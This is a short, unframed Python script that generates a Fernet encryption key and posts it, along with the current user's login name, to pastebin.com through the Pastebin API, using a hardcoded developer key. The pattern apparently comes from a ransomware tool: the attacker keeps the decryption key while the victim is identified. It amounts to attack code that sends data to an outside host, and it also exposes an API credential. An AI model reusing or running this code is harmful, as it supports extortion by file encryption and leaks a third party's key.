from cryptography.fernet import Fernet
import requests, os
key = Fernet.generate_key()
#we can 
data = {'api_dev_key':"LRAhthwxGUSpl7J4pS5WNZUqmheviW3Z",
        'api_option':'paste',
        'api_paste_code':"{0} -|- {1}".format(key, os.getlogin()),
        'api_paste_format':'python'}
requests.post("https://pastebin.com/api/api_post.php", data=data)
